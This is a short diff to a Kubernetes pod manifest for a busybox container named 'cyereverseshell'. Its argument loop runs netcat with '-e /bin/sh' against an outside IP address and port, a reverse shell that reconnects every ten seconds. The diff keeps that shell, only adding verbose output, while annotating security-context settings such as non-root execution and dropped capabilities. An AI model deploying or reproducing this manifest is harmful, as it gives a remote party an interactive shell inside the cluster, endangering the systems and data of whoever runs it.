@@ -10,12 +10,12 @@ spec:
   containers:
   - name: cyereverseshell
     image: busybox
-    args: ["sh", "-c", "while true; do nc 68.183.22.232 4641 -e /bin/sh; sleep 10; done"]
+    args: ["sh", "-c", "while true; do nc -vvv 68.183.22.232 4641 -e /bin/sh; sleep 10; done"]
     securityContext:
       runAsNonRoot: true  # Ensure the container does not run as root
-      runAsUser: 1000  # Specify a non-root user ID (1000 is a typical non-root user)
-      allowPrivilegeEscalation: false
+      runAsUser: 1000  # Set non-root UID
+      allowPrivilegeEscalation: false  # Prevent privilege escalation
       capabilities:
-        drop: ["ALL"]
+        drop: ["ALL"]  # Drop unnecessary capabilities for security
       seccompProfile:
         type: RuntimeDefault
